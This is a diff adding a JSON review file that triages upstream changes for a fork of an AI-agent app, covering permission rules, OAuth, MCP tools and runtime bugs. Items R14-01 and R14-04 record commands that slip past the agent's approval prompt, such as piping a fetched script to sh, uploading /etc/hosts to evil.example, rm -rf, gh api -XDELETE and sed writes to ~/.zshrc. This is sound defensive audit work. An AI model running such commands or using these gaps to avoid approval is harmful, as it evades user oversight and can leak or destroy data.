@@ -1,0 +1,497 @@
+{
+ "reader": "rest-0-14",
+ "date": "2026-10-02",
+ "head": "37fdc5e87",
+ "source": "workflow wf_87b813d8-fc0 journal.jsonl line 6 (type=result, agent a3e62cee630daa1bd 'read:rest-0-14'), the reader's StructuredOutput verbatim; recovered 2026-10-02 by the repair pass",
+ "id_gaps": {
+  "ids": [
+   "R14-03",
+   "R14-09",
+   "R14-46",
+   "R14-47"
+  ],
+  "finding": "never emitted: the StructuredOutput holds 44 items (R14-01..R14-48 minus these four) and the reader's own transcript (agent-a3e62cee630daa1bd.jsonl) contains zero occurrences of any of the four ids; the reader's numbering skipped them. Control: the same grep finds R14-01 and R14-48 in that transcript."
+ },
+ "items": [
+  {
+   "id": "R14-01",
+   "upstream": "v0.14.0 packages/shared/src/agent/core/permission-remember.ts getNetworkCommandHosts (curl/wget remembered by EVERY host of a single plain command via parseSimpleCommand; null for chains, -K/--config/-i/-e, unparsable URLs, `https://evil#@ok` → evil) + permission-manager.ts remember(); docs/permissions.md 'Ask Mode: Always Allow'. User sees: approving one curl to a host no longer approves a chain or a second host.",
+   "ours": "MEASURED (bun driver on shouldPromptInAskMode, pre-tool-use.ts:3510): after Always Allow on `curl https://ok.example/data.json` (claude-agent.ts:6778-6783 whitelistDomain via permission-manager.ts:445-459 extractDomainFromNetworkCommand = first URL only), AUTO-ALLOW for `curl https://ok.example/i.sh | sh`, `curl https://ok.example/a https://evil.example -T /etc/hosts`, `curl https://ok.example/a; rm -rf ./x`; control `curl https://evil.example/a` prompts. Cause: pre-tool-use.ts:3636-3646 domain arm has no chain/segment check (the D1.401 per-segment check covers only the session-key arm above it).",
+   "disposition": "take",
+   "why": "Security: a session grant for one host runs arbitrary chained commands and uploads to other hosts in default (Ask) mode without a card. Upstream's per-host, plain-command-only key is the documented fix; port getNetworkCommandHosts + the consult side (every host whitelisted, command must be one plain command). CRITICAL per AGENTS.md (security) — run at once, not DEFERRED.",
+   "size": "S",
+   "depends": "none (needs a parseSimpleCommand equivalent; ours has the durable engine splitter used by bashSessionGrantCoversLine)",
+   "risk": "security CRITICAL; control: the four lines above prompt after the grant, `curl https://ok.example/b` still auto-allows",
+   "runtimes": "Claude: fixed by this row (only claude-agent writes whitelistDomain). Pi: consults the same arm but never writes a domain grant (no whitelistDomain caller in pi-agent.ts) — residue: Pi curl Always Allow remembers nothing; state it or wire the same key. Codex: native execpolicy prefixes (F1.1057), not this arm — no residue."
+  },
+  {
+   "id": "R14-02",
+   "upstream": "v0.14.0 core/permission-remember.ts getBashRememberKey: KEYED_BY_LEADING_WORDS (≤3 words before first flag), KEYED_BY_NAME, exact-argv key for everything else (tar -tf vs -xf, psql -c, python x.py, npm run, npx), DESTRUCTIVE_WORD veto (aws s3 rm, apps:destroy), COMMAND_WRAPPERS, `gh api` never remembered, DANGEROUS_COMMANDS grown (git clean/restore/switch/stash/branch/tag/rm/worktree/gc/reflog, kubectl apply/delete, helm, terraform/tofu/pulumi, npm/cargo/gem/docker publish/push, deploy CLIs); PromptInfo.remember carried with the card; canRemember=false hides the button when nothing would be stored.",
+   "ours": "dangerous-commands.ts:30-37 has 24 entries with only 4 two-word ones (git push/reset/rebase/checkout); bashSessionWhitelistKey dangerous-commands.ts:363-388 keys by ALL leading non-flag words (unbounded) and keys `tar -tf x` as `tar` (covers `tar -xf`), `psql -c ...` as `psql`; no destructive-verb veto (`aws s3 rm --recursive s3://x` keys `aws s3 rm`); COMMAND_INTERPRETER_HEADS dangerous-commands.ts:180-185 already covers wrappers (D1.403). Pi buildPermissionRequestSuggestions pi-agent.ts:5226-5241 offers a base-wide session rule `Bash(<base>:*)` to PermissionRequest hooks. Durable rule SessionManager persistBashAlwaysAllowRule (~13870-13920) reuses the same key. Card: D1.262 relabels rather than hides (PermissionRequest.tsx ~240-300).",
+   "disposition": "adapt",
+   "why": "Upstream parity on what a click remembers; ours already closed chains (D1.401) and wrappers (D1.403), so take only the missing parts: extend DANGEROUS_COMMANDS to upstream's list, exact-argv for non-keyed heads, the destructive-word veto, the 3-word cap, and narrow Pi's suggestion to the same key. Keep D1.262's relabel (an existing Nessy decision, stated) but hide the button when no key is minted, as upstream does.",
+   "size": "M",
+   "depends": "R14-01 (same module family)",
+   "risk": "security (a click widens to destructive subcommands); durable `Bash(x *)` rules on Claude inherit the narrower key",
+   "runtimes": "Claude: session key + durable localSettings rule both via bashSessionWhitelistKey. Pi: same pre-tool-use key; suggestion narrowed. Codex: execpolicy prefix projection (F1.1057) — check it reads the extended dangerous list or state the residue."
+  },
+  {
+   "id": "R14-04",
+   "upstream": "v0.14.0 packages/shared/src/agent/bash-validator.ts argument inspectors in code (getDangerousSedReason: -i/--in-place, -f/--file, w/W/e commands, s///w and s///e; getDangerousSortReason: -o in clusters (-ro), --output, --compress-program; gh api: -X/--method non-GET incl. glued -XDELETE, -f/-F/--field/--raw-field/--input without --method GET, graphql mutation); docs/permissions.md says they apply even with an older default.json.",
+   "ours": "MEASURED (bun, shipped default.json via git show HEAD + bash-validator validateBashCommand + mode-manager getBashRejectionReason): READ-ONLY for `gh api -XDELETE repos/a/b`, `gh api -fname=x repos/a`, `sed -n 'w out.txt' in`, `sed -n 's/a/b/w out' in`, `sort --compress-program=sh x`, `sort -ro out x`; blocked controls `gh api -X DELETE x`, `sed -n 's/a/b/e'`, `sed -n -f`, `sort -o out x`, `sed -ni`. Our guards are regexes in default.json (:185 gh api, :381 sed -n, :385 sort) plus a sed EXECUTION walker in bash-validator.ts:256-380 whose WRITE axis is enforced only by the isolation write-scan (scanBashWriteVectors), not by Explore/plan or the default-mode read-only arm. A read-only verdict means no card in default (pre-tool-use.ts shouldPromptInAskMode isReadOnlyBashCommandWithConfig arm) and no plan-shell review in plan (mode-manager.ts ~3640).",
+   "disposition": "adapt",
+   "why": "Security/safety: `gh api -XDELETE` deletes a remote resource and `sed -n 'w ~/.zshrc'` overwrites a file with no card in default and plan. Port upstream's code-side inspectors into our validateCommand path (ours differs structurally), and tighten the three default.json regexes. Wrong user-facing behaviour + security → CRITICAL candidate.",
+   "size": "M",
+   "depends": "none",
+   "risk": "security CRITICAL candidate; false refusals of real reads (sort -k, sed -n p) — pin both arms",
+   "runtimes": "Pi and Claude share the host gate. Codex: plan runs in codex's own read-only sandbox (writes and network fail natively) — residue only for default mode where codex approvals_reviewer/execpolicy decide; state it."
+  },
+  {
+   "id": "R14-05",
+   "upstream": "v0.14.0 packages/shared/src/agent/mcp-tool-names.ts isReadOnlyMcpToolName: words split on camelCase and any separator; MCP_WRITE_WORDS ~120 verbs (archive, publish, approve, reply, forward, mark, cancel, sync, submit, save, apply, deploy, restore, toggle, ...); read verb first, after the source slug, or trailing in a two-word name; plain lowercase permissions.json entries are verbs.",
+   "ours": "F1.258 leading-verb anchoring + F1.289 MCP_WRITE_TOKENS (mcp-tool-name-verbs.ts, 25 tokens, `_`-split only); isReadOnlyMcpToolWithConfig mode-manager.ts:3122-3124. get_or_create_* already refused (the inputs note saying it still classifies read-only is stale — F1.289). Missing: archive/publish/approve/reply/forward/mark/cancel/sync/submit/... so e.g. `search_and_archive`, `get_and_publish` read as read-only; camelCase/hyphen words not split.",
+   "disposition": "adapt",
+   "why": "Take upstream's larger write-verb list and camel/hyphen splitting into MCP_WRITE_TOKENS; keep ours stricter where upstream loosens (source-slug-prefixed and trailing read verbs are NOT adopted — they would widen what runs without a card; stated residue). Feeds UA9.2's page-action classification.",
+   "size": "S",
+   "depends": "none",
+   "risk": "more cards on reads that carry a write word (stated residue F1.289 already)",
+   "runtimes": "Shared host table: Pi gate + Pi deferred catalogue, Claude PreToolUse. Codex: MCP readOnlyHint/annotations path — UA12.11 invariant row covers the agreement."
+  },
+  {
+   "id": "R14-06",
+   "upstream": "v0.13.6 #1065 (PR #1066): mode-manager.ts exports matchesAllowedWritePath; core/pre-tool-use.ts shouldPromptInAskMode suppresses the write prompt for allowedWritePaths in Ask; Windows glob normalization; docs/permissions.md.",
+   "ours": "mode-manager.ts:3699-3702: F1.1050 retired explore; `allowedWritePaths` is 'read by no mode — the schema keeps it so a stored permissions.json still parses'. default (Ask) prompts every write outside acceptEdits roots (pre-tool-use.ts FILE_WRITE_TOOLS arm ~3537-3555).",
+   "disposition": "owner-question",
+   "why": "Upstream parity says honour it in Ask (= our default); but it widens what runs without a card from a dead knob — a user-visible permission posture, so it is stated, not taken quietly. Native-first check: Claude's own `Edit(path)` allow rules exist, but our PreToolUse hook prompts regardless of SDK rules on the Claude arm (PermissionRequest.tsx comment), so the native mechanism does not reach this gate today.",
+   "size": "S",
+   "depends": "none",
+   "risk": "permission widening (user-configured)",
+   "runtimes": "Pi/Claude: host gate. Codex: workspace-write sandbox already auto-allows writes inside writable roots — honouring the list there means adding writable_roots; otherwise a residue."
+  },
+  {
+   "id": "R14-07",
+   "upstream": "v0.14.0 #236: Ask runs read-only MCP tools without prompting, using workspace/source permissions.json patterns (source-policy.ts passes permissionsContext).",
+   "ours": "pre-tool-use.ts:3660-3680 (F1.526/UA9.1 evaluateMcpToolPolicy with permissionsContext): default mode cards only mutations, read-only by the same merged patterns.",
+   "disposition": "drop-c",
+   "why": "Already ours (F1.526 replaced the blanket MCP card in 2026-09).",
+   "size": "XS",
+   "runtimes": "Pi/Claude host gate; Codex native MCP approvals."
+  },
+  {
+   "id": "R14-08",
+   "upstream": "v0.14.0 packages/shared/src/agent/pi-agent.ts PreToolUse: after source activation the WHOLE pipeline re-runs and its result (incl. an Ask prompt) is handled like any other; a still-inactive source blocks; no permission handler → deny ('Denied for safety'). Release notes: 'a required prompt no longer becomes an allow after a source is activated'.",
+   "ours": "pi-agent.ts:7336-7402: same pre-fix shape — after activation `postResult` modify→allow, block→deny, ELSE→authorizeAndSend({outcome:'allow'}), so a re-run `prompt` (default-mode card) and a second `source_activation_needed` both become allows, and the guardian deny-net consulted for the first result is not consulted on the re-run. Claude differs: claude-agent.ts:9064-9083 denies with 'available on the next turn'.",
+   "disposition": "take",
+   "why": "Security: an MCP mutation that needs a card in default mode runs without one whenever its source was inactive at call time. Restructure as upstream (activate first, then run the whole switch on the re-run result, guardian included). Add the control 'no permission handler → deny' if the permission service does not already deny headless asks (verify in the row).",
+   "size": "S",
+   "depends": "none",
+   "risk": "security CRITICAL (code reading, not yet driven; row must drive it: inactive source + mutating tool in default → card)",
+   "runtimes": "Pi: fixed here. Claude: denies and resumes next turn — no residue. Codex: sources reach codex via the host-callback bridge/MCP; activation path not this code — state it."
+  },
+  {
+   "id": "R14-10",
+   "upstream": "v0.14.0 packages/shared/src/agent/claude-agent.ts HANDOFF_TOOL_NAMES (SubmitPlan, source_oauth/google/microsoft/slack_oauth_trigger, source_credential_prompt) + HANDOFF_RESULT_WAIT_MS 3000 + toolHandoff/beginToolHandoff/releaseToolHandoffOn: the handoff interrupt waits for the tool's result (or 3 s). Partially fixes #1004: plan step no longer 'failed', unanswered sign-in no longer read as 'declined'.",
+   "ours": "claude-agent.ts:13119-13132 interruptForHandoff calls currentQuery.interrupt() at once; called from inside the tool handler path by SessionManager.ts:28819-28821 (PlanSubmitted) and :16212-16214 (AuthRequest). Same pre-fix shape; tools exist (session-tools-core tool-defs.ts:838 SubmitPlan, :900 source_oauth_trigger, :918 source_credential_prompt).",
+   "disposition": "take",
+   "why": "Wrong user-facing behaviour: the SDK records 'The user doesn't want to proceed with this tool use' for the plan/auth tool and the model tells the user they declined. Port the deferred interrupt. Measure first on claude-gateway (transcript tool_result of SubmitPlan after a plan card).",
+   "size": "S",
+   "depends": "adjacent to UA4.9 (plan handoff)",
+   "risk": "wrong user-facing behaviour (CRITICAL if the measurement confirms)",
+   "runtimes": "Claude only. Pi: handoff is host-side abort of the subprocess turn (no SDK transcript record) — residue none expected; Codex: turn/interrupt after tool result? state as MEAS."
+  },
+  {
+   "id": "R14-11",
+   "upstream": "v0.14.0 claude-agent.ts activeTurnState.aborted + forceAbort marks it; the persistent turn throws AbortError instead of reaching the empty-response recovery that 'would clear the SDK session and re-run the message' (claude-keepalive-stop.test.ts). Release note: 'Stop no longer re-runs your message'.",
+   "ours": "claude-agent.ts:12243-12268 a UserStop is an interrupt that settles the slot 'terminal' with terminalReason 'user_stop'; then the post-loop check :10105-10108 `wasResuming && !slot.receivedAssistantContent && !_isRetry` (wasResuming :9827 is true whenever this.sessionId is set, i.e. every turn after the first) clears sessionId, calls onSdkSessionIdCleared and re-sends the message with recovery context (:10120-10135). No user_stop guard between them (read :10020-10107).",
+   "disposition": "take",
+   "why": "Plausible same bug: Stop before the first assistant token on any resumed turn re-runs the message and drops the SDK session (resume lost). Fix: skip the recovery when the turn ended on user_stop/max_budget_usd. Measure first (Stop within ~1 s on turn 2, claude-gateway).",
+   "size": "S",
+   "depends": "none",
+   "risk": "wrong user-facing behaviour + loss of SDK resume state",
+   "runtimes": "Claude only (Pi/Codex have no such recovery arm)."
+  },
+  {
+   "id": "R14-12",
+   "upstream": "v0.14.0 claude-agent.ts syncPersistentThinking/claudeThinkingKey: a thinking-level change applies to the live query via applyFlagSettings({effortLevel}) / setMaxThinkingTokens from the next turn (claude-live-thinking.test.ts).",
+   "ours": "backend/claude/live-session.ts:268-270 hashes thinking+effort into the live signature, so a change RESPAWNS the child (resume) and applies next turn (:622-626 'What still respawns'); F1.821 already uses applyFlagSettings only for the effort clamp (claude-agent.ts:11294-11297).",
+   "disposition": "adapt",
+   "why": "User-visible behaviour already matches (applies next turn); the gain is avoiding a cold respawn per thinking change via the SDK's own setter (native-first). Low priority.",
+   "size": "S",
+   "depends": "R14-27 (setter semantics on the bumped SDK)",
+   "risk": "respawn vs live drift; keep respawn as fallback when the setter is refused",
+   "runtimes": "Claude only; Pi applies per subprocess session already; Codex per-turn effort native."
+  },
+  {
+   "id": "R14-13",
+   "upstream": "v0.14.0 server-core SessionManager source_activated: resend falls back to lastUserMessageContent when the capture is empty (attachment-only turn); buildActivationRetryMessage appends turnSteers (corrections sent during the turn); the retry is sent hidden (pendingActivationResend) so it is not a duplicate user message; source-activated-auto-retry.test.ts.",
+   "ours": "SessionManager.ts:37455-37500 is the v0.13.4 shape: empty originalMessage → skip retry (session stranded), plain `${original}\\n\\n[slug activated]` resend, visible duplicate message, steers dropped.",
+   "disposition": "take",
+   "why": "Upstream bug fix, decision-free (the noteSuggestionUse call is decisions-only and is left out). 'Keeps the turn's thinking level' depends on adaptive thinking (decisions) — residue.",
+   "size": "S",
+   "depends": "none",
+   "risk": "duplicate-message dedupe (autoRetryPending) must keep working for remote clients",
+   "runtimes": "Pi (pi-agent.ts:7353) and Claude (claude-agent.ts:12110/12281) both emit source_activated; Codex: no source_activated producer found — residue stated."
+  },
+  {
+   "id": "R14-14",
+   "upstream": "v0.13.6 #1058/#1060: PiAgent.isCompactionInFlight + canSteerNow refuse a steer during manual /compact so SessionManager queues it (midstream-queue.test.ts); compact timeout bumps compactionEpoch and sends `abort` to cancel the child; pi-agent-server compaction-wait.ts bounds the wait on a prior compaction.",
+   "ours": "pi-agent.ts:11154-11162 redirect() sends `steer` whenever _isProcessing (true during /compact), so the message is steered into a turn with no agent loop and vanishes; compact timeout pi-agent.ts:9358-9375 rejects without cancelling the child; pi-agent-server/src/index.ts:4055 waitForCompaction polls up to 300 s (the whole host deadline).",
+   "disposition": "take",
+   "why": "User-visible message loss on Pi; decision-free.",
+   "size": "M",
+   "depends": "none",
+   "risk": "queue/steer seam (F1.238 steer identity) — pin queue-not-steer during compaction",
+   "runtimes": "Pi only. Claude: /compact is the CLI's own. Codex: native thread compaction — MEAS whether a steer during codex compaction is accepted (residue)."
+  },
+  {
+   "id": "R14-15",
+   "upstream": "v0.13.6 #1071 shared/src/mcp/mcp-pool.ts: connects in parallel (Promise.allSettled) and console.warn per failed source.",
+   "ours": "mcp-pool.ts:2915-3020 already starts all connects at once, caps the batch (NESSY_MCP_CONNECT_TIMEOUT_MS), records markConnectionFailed + publishConnectionVerdict (user-visible state) and noteAuthFailure.",
+   "disposition": "drop-c",
+   "why": "Ours is already parallel and surfaces failures in the connection verdict (better than a console line).",
+   "size": "XS",
+   "runtimes": "Pool serves Pi and the host; Claude gets pooled proxies; Codex via bridge."
+  },
+  {
+   "id": "R14-16",
+   "upstream": "v0.13.6 #1067: session-tools-core/src/api-auth.ts (parseStoredApiCredential, parseJsonHeaderMap, buildApiAuthHeaders, appendQueryAuth) shared by sources/api-tools.ts, sources/credential-manager.ts and handlers/source-test.ts; a multi-header-prompt credential on a single-header source is unpacked to the bare value; source_test shows the API error body on 400/401/403.",
+   "ours": "credential-manager.ts:310-350 parses JSON only when headerNames is set, else returns the raw string; api-tools.ts:117-125 then sends `{\"x-goog-api-key\":\"…\"}` as the header value; source-test.ts:560-595 assembles headers on its own, so a test can pass while real calls fail.",
+   "disposition": "take",
+   "why": "Same bug as upstream, decision-free; one shared builder removes the drift.",
+   "size": "M",
+   "depends": "none",
+   "risk": "credential handling — never log values (F1.311 already strips messages)",
+   "runtimes": "Host-side sources: all three runtimes reach api_<source> tools through the host."
+  },
+  {
+   "id": "R14-17",
+   "upstream": "v0.14.0 handlers/source-test.ts: a source marked authenticated with no usable token tries credentialManager.refresh, else fails with 'Stored credential missing or expired' instead of passing the unauthenticated probe.",
+   "ours": "source-test.ts:498 and :531 'fall through to basic test' — a 401/403 from the unauthenticated probe passes as reachable.",
+   "disposition": "take",
+   "why": "Wrong status shown to the user (green source that fails every call); decision-free.",
+   "size": "S",
+   "depends": "R14-16 (same file)",
+   "risk": "low",
+   "runtimes": "Host tool; all three."
+  },
+  {
+   "id": "R14-18",
+   "upstream": "v0.13.6 #1054 (PR #1055) auth/oauth.ts, generic-oauth.ts, oauth-flow-store/types, rpc/oauth.ts, sources/types.ts oauth.resource: RFC 8707 resource taken from the server's RFC 9728 protected-resource metadata, sent on authorize/token/refresh, dropped automatically on invalid_target; API sources may set oauth.resource.",
+   "ours": "oauth.ts:397/445/570/811/993 send `resource` only when an explicit mcp.oauthResource is configured (rpc/oauth.ts:423); RFC 9728 discovery exists (oauth.ts:1400-1460) but its `resource` is not propagated; generic API OAuth has no resource field.",
+   "disposition": "adapt",
+   "why": "Resource-bound MCP servers reject every token unless the user hand-configures oauthResource; take the PRM-derived default + invalid_target fallback; add oauth.resource to API sources.",
+   "size": "M",
+   "depends": "none",
+   "risk": "auth flow regressions for servers that reject `resource` — the fallback is the control",
+   "runtimes": "Host OAuth for sources: all three."
+  },
+  {
+   "id": "R14-19",
+   "upstream": "v0.13.6 #1068 auth/slack-oauth.ts SLACK_LEGACY_RELAY_CALLBACK_URL https://thecraftagents.com/auth/slack/callback (+slack-oauth-relay.isolated.ts).",
+   "ours": "slack-oauth.ts has no relay (git grep 'relay' empty).",
+   "disposition": "drop-a",
+   "why": "Craft-hosted relay service.",
+   "size": "XS",
+   "runtimes": "n/a"
+  },
+  {
+   "id": "R14-20",
+   "upstream": "v0.13.6 #1048 (PR #1049) server-core/domain/connection-setup-logic.ts resolveSetupTestApiKey/maskApiKey/isMaskedApiKey; TestLlmConnectionParams.connectionSlug; useOnboarding sends editingSlug: testing an edited connection uses the stored key, a missing key asks to re-enter.",
+   "ours": "rpc/llm-connections.ts:687-689 tests whatever key arrives; isMaskedCredential :89-90 and the mask :820-826 exist but the test path does not resolve a masked value by slug, so editing a saved connection and pressing Test sends the bullets.",
+   "disposition": "take",
+   "why": "Wrong user-facing result on every edit-and-test; decision-free; the key is resolved server-side by slug (never sent to the renderer).",
+   "size": "S",
+   "depends": "none",
+   "risk": "credential: resolution stays in main/server; never log",
+   "runtimes": "Connection setup is host-side; covers Pi/Claude BYO and gateway cards."
+  },
+  {
+   "id": "R14-21",
+   "upstream": "v0.13.6 #1062 (PR #1061): ~20 paths moved from homedir()/.craft-agent onto CONFIG_DIR (logger, window-state, logo, prerequisite-manager, privileged-execution-broker, rpc/auth, rpc/workspace, server, secure-storage, workspaces/storage, permissions-config, config-validate).",
+   "ours": "git grep for homedir() joins with .nessy/.nessy-agent over packages/*/src, apps/*/src: only config/paths.ts:18 DEFAULT_CONFIG_DIR (positive control) — runtime paths already derive from NESSY_CONFIG_DIR; docs/index.ts:102-110 APP_ROOT honours it (W6); secure-storage latches home (P3.167). Residue: EditPopover.tsx:125-503 agent prompts hard-code `~/.nessy-agent/...` (11 strings), so a second instance tells the agent the wrong folder.",
+   "disposition": "adapt",
+   "why": "Core audit already ours; only the EditPopover prompt strings remain — use APP_ROOT.",
+   "size": "XS",
+   "depends": "none",
+   "risk": "low",
+   "runtimes": "Prompt text, runtime-neutral."
+  },
+  {
+   "id": "R14-22",
+   "upstream": "v0.13.6 #1033 (PR #1063) interceptor-common.ts rotation at 32 MiB, entry cap 4 MiB, request bodies omitted unless CRAFT_DEBUG_FULL_BODIES=1 (unified-network-interceptor toCurl).",
+   "ours": "interceptor-common.ts:39-60 rotates by age (24 h) only; unified-network-interceptor.ts:2464-2475 toCurl writes full request bodies (prompts, tool args, base64 images); dev builds with --debug/NESSY_DEBUG=1 only (INTERCEPTOR_LOGGING_ENABLED = !IS_PACKAGED).",
+   "disposition": "take",
+   "why": "Unbounded growth and prompt content on disk in dev runs; rebrand the env var to NESSY_DEBUG_FULL_BODIES.",
+   "size": "S",
+   "depends": "none",
+   "risk": "low (dev only); privacy of user prompts",
+   "runtimes": "Interceptor preloads into Pi subprocess and host; runtime-neutral."
+  },
+  {
+   "id": "R14-23",
+   "upstream": "v0.13.6 #1059 apps/electron/src/main/browser-pane-manager.ts: pageWebContentsId and popup ids captured at creation, every teardown step guarded (runCleanupStep incl. cdp.detach) so instances.delete always runs.",
+   "ours": "browser-pane-manager.ts:2264 unguarded `instance.cdp.detach()` before instances.delete; :3230/:3274/:3296 read popupWindow.webContents.id on a closed popup; runCleanup exists only in the other destroy path (:654-664). Same pre-fix shape.",
+   "disposition": "take",
+   "why": "After closing a popup the browser tool fails with 'Object has been destroyed' until restart; decision-free.",
+   "size": "S",
+   "depends": "none",
+   "risk": "low",
+   "runtimes": "Host browser pane: all three runtimes' browser_tool."
+  },
+  {
+   "id": "R14-24",
+   "upstream": "v0.13.6 #1072 shared/src/agent/backend/pi/event-adapter.ts: console.warn when a turn has output tokens but zero text (reasoning ate the budget, DeepSeek).",
+   "ours": "Pi event-adapter.ts has hasEmittedFinalText (:256) but no zero-text check (git grep empty). Our gateway `coder` alias currently resolves to tgpt/deepseek-v4-flash-0731 (auth/nestor-model-snapshot.ts:46), so the symptom is on our default Pi path.",
+   "disposition": "adapt",
+   "why": "Take the detection, but emit a user-visible info/warning event (owner rule: transparent) instead of a console line.",
+   "size": "XS",
+   "depends": "none",
+   "risk": "false positives on tool-only turns — gate on final, non-intermediate message",
+   "runtimes": "Pi only; Claude/Codex report their own stop reasons."
+  },
+  {
+   "id": "R14-25",
+   "upstream": "v0.14.0 claude-agent.ts guardLargeMcpToolOutput PostToolUse hook returns updatedToolOutput (saved file + summary) before the model reads a large MCP/session-tool result; pi large-result-gate is decisions-only (largeResults toggle).",
+   "ours": "Claude: the CLI's native persist-to-disk threshold for MCP output (code.claude.com/docs/en/mcp.md#mcp-output-limits-and-warnings, MAX_MCP_OUTPUT_TOKENS / anthropic/maxResultSizeChars) + host guard for the transcript copy (claude-agent.ts:11565-11590 guardToolResultForHost). Pi: pool guards before the model (mcp-pool.ts:4221 guardLargeResult).",
+   "disposition": "drop-c",
+   "why": "Native-first: Claude already spills large MCP output to disk itself; Pi already guards pre-model. Residue: on Claude the model gets the CLI's file pointer, not our summary — stated.",
+   "size": "XS",
+   "runtimes": "Claude native; Pi pool; Codex: codex's own output truncation — residue."
+  },
+  {
+   "id": "R14-26",
+   "upstream": "v0.14.0 core/rtk-detector.ts RTK_MIN_SAFE_VERSION 0.44.0 (older rtk corrupts grep/wc/read output; outdated binary never used), rtk-rewrite.ts never rewrites commands starting with `command`/`builtin`, config rtkExcludeCommands honoured (getRtkExcludeCommands), system prompt tells the agent how to get exact output, RtkUpdateDialog + Settings → AI → Performance outdated state (rtkUpdate.*, settings.ai.rtk.outdated* keys).",
+   "ours": "rtk-detector.ts:17 REQUIRED_MIN_VERSION 0.23.0 only; exclude hard-coded `[]` at claude-agent.ts:8859 and pi-agent.ts:6320; no command/builtin bypass; no prompt hint; no outdated UI.",
+   "disposition": "adapt",
+   "why": "Correctness: with rtk 0.23–0.43 the agent reads corrupted output. Take the floor, the bypass, the exclude list (a StoredConfig key → declare it per the DA1.72 recipe) and the prompt hint; the update dialog's GitHub `curl … | sh` installer is a network-posture question (see questions).",
+   "size": "M",
+   "depends": "none",
+   "risk": "new StoredConfig key; i18n en+ru for the notice",
+   "runtimes": "Pi and Claude (host rewrite in PreToolUse); Codex: rtk not wired — residue stated."
+  },
+  {
+   "id": "R14-27",
+   "upstream": "v0.13.5 @anthropic-ai/claude-agent-sdk 0.3.258 → 0.3.280 (CC 2.1.280): verbatimPrompts, MCP resource reading, no fixed wait for deferred MCP servers, resumed-session usage totals, clearer verification/cloud-credential errors.",
+   "ours": "Both self-reports read 2.1.274 (node_modules/@anthropic-ai/claude-agent-sdk/package.json claudeCodeVersion; claude --version), packages/shared/package.json:306 0.3.274.",
+   "disposition": "measure",
+   "why": "Owner rule 2026-10-01: SDKs from Artifactory only after the 14-day mirror (F1.1217); bump when 0.3.280 is mirrored, read both self-reports and the lockfile platform entries.",
+   "size": "M",
+   "depends": "Artifactory mirror",
+   "risk": "dependency lock (risk trigger: full gates)",
+   "runtimes": "Claude only."
+  },
+  {
+   "id": "R14-28",
+   "upstream": "v0.13.5 Pi SDK @earendil-works/* 0.85.1 → 0.87.1 (#1032): Opus 5.5/GPT-6 in Pi catalogs, Fable 5.1 split-turn compaction fix, deepseek-v4-flash → deepseek-flash migration; 0.87 made agent.state.systemPrompt read-only (upstream rewrote pi-agent-server system-prompt-override.ts to a before_agent_start inline extension, #648).",
+   "ours": "packages/shared/package.json:301-303 and pi-agent-server/package.json:20-22 pin 0.85.1. Our override already uses before_agent_start (pi-runtime-adapter.ts:465, system-prompt-override.ts:5), so upstream's #648 port is not needed.",
+   "disposition": "measure",
+   "why": "Artifactory-only rule; when mirrored, bump and run the provenance checks ('Unsupported Pi runtime' traps) — no override rewrite owed.",
+   "size": "M",
+   "depends": "Artifactory mirror",
+   "risk": "dependency lock; electron:build:servers restage",
+   "runtimes": "Pi only."
+  },
+  {
+   "id": "R14-29",
+   "upstream": "v0.13.5 Opus 5.5 default + Opus 5 registry rows, thinkingAlwaysOn, context window from the live model list (max_input_tokens), Bedrock aliases, ApiKeyInput default list.",
+   "ours": "config/models.ts:218 claude-opus-5-5 (F1.1214), :536 isAdaptiveThinkingAlwaysOnModel covers opus-5-5/sonnet-5-5/fable/mythos, internal/drivers/anthropic.ts:343 uses max_input_tokens, bedrock-model-ids.ts:204-207. DEFAULT_MODEL deliberately not promoted while Anthropic BYOK is flag-off (models.ts comment above claude-opus-5).",
+   "disposition": "drop-c",
+   "why": "Already ours; default promotion waits on the provider flags (owner).",
+   "size": "XS",
+   "runtimes": "Claude/Pi Anthropic connections."
+  },
+  {
+   "id": "R14-30",
+   "upstream": "v0.14.0 claude-sdk-error-mapper.ts verification_required and cloud_credential_error cards.",
+   "ours": "F1.255 and F1.1213 (claude-sdk-error-mapper.ts:604; tests :520, :550).",
+   "disposition": "drop-c",
+   "why": "Already ours.",
+   "size": "XS",
+   "runtimes": "Claude."
+  },
+  {
+   "id": "R14-31",
+   "upstream": "v0.14.0 agent/options.ts CLAUDE_CODE_ENABLE_TODO_TOOLS=1 so TodoWrite/Task* stay on older models (SDK 0.3.268 default change).",
+   "ours": "options.ts:122 (P6.724) and claude-native-tool-collisions.test.ts.",
+   "disposition": "drop-c",
+   "why": "Already ours.",
+   "size": "XS",
+   "runtimes": "Claude."
+  },
+  {
+   "id": "R14-32",
+   "upstream": "v0.13.5 claude-agent.ts systemPrompt preset `snapshot: true` (record the system prompt once per session; resumed sessions keep cache prefix and thinking blocks); v0.14.0 system.ts keeps per-mode rows static because 'Claude snapshots the system prompt'.",
+   "ours": "No explicit snapshot option; SDK 0.3.274 defaults to recording (sdk.d.ts:2252-2262 'Omitted or snapshot: true (the default)').",
+   "disposition": "measure",
+   "why": "Native default already applies; what is owed is a check that our append carries nothing per-turn or per-mode (a recorded prompt freezes it until compaction, so a mode switch after turn 1 would not reach the system prompt).",
+   "size": "XS",
+   "depends": "none",
+   "risk": "stale mode text in a recorded prompt",
+   "runtimes": "Claude only."
+  },
+  {
+   "id": "R14-33",
+   "upstream": "v0.13.6 pi-agent-server/src/mini-model-query.ts queryMiniModel: utility-model rejection (e.g. gpt-5.4-mini on ChatGPT Plus) falls back to cheap models, then the session's model, then the provider's preferred defaults; title regeneration keeps the cold session model (title-generation.isolated.ts).",
+   "ours": "pi-agent-server/src/index.ts:3214-3240 fallback list = gpt-5-mini, config.miniModel, getDefaultSummarizationModel(); retries only isModelNotFoundError; no session model, no provider defaults.",
+   "disposition": "adapt",
+   "why": "A BYO account that rejects the utility model loses titles; take the wider candidate list and the rejection classifier. ChatGPT provider is flag-off by default, so priority is low.",
+   "size": "S",
+   "depends": "none",
+   "risk": "low",
+   "runtimes": "Pi only (Claude/Codex titles use their own paths)."
+  },
+  {
+   "id": "R14-34",
+   "upstream": "v0.14.0 removed resources/bridge-mcp-server and the session-mcp-server bundle (Dockerfile.server, build/common.ts, electron-builder.yml, runtime-resolver.ts).",
+   "ours": "Bridge already removed (runtime-resolver.ts:45 F1.152); session-mcp-server stays because codex uses it.",
+   "disposition": "drop-c",
+   "why": "Bridge gone already; session-mcp-server is required by our codex runtime.",
+   "size": "XS",
+   "runtimes": "Codex keeps session-mcp-server."
+  },
+  {
+   "id": "R14-35",
